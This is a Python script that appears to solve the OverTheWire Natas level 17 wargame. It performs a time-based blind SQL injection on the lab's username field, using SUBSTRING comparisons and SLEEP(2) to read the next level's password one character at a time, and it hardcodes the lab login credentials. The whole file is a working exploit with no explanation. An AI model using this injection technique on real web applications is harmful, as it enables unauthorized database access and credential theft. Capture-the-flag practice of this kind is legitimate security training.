import requests
from requests.auth import HTTPBasicAuth
import string
import time

url = "http://natas17.natas.labs.overthewire.org/index.php"
auth = HTTPBasicAuth('natas17', 'EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC')

password = ""
# Try both uppercase and lowercase
charset = string.ascii_lowercase + string.ascii_uppercase + string.digits

print("Extracting password...")
for position in range(1, 33):
    found = False
    for char in charset:
        # BINARY keyword forces case-sensitive comparison
        payload = f'natas18" AND BINARY SUBSTRING(password,{position},1)=BINARY "{char}" AND SLEEP(2)-- -'
        
        try:
            start = time.time()
            r = requests.post(url, auth=auth, data={'username': payload}, timeout=4)
            elapsed = time.time() - start
            
            if elapsed >= 1.8:
                password += char
                print(f"Pos {position}: '{char}' -> {password}")
                found = True
                break
        except requests.Timeout:
            password += char
            print(f"Pos {position}: '{char}' -> {password}")
            found = True
            break
        except Exception as e:
            continue
    
    if not found:
        print(f"STUCK at position {position}!")
        print(f"Password so far: {password}")
        break

print(f"\nFinal: {password}")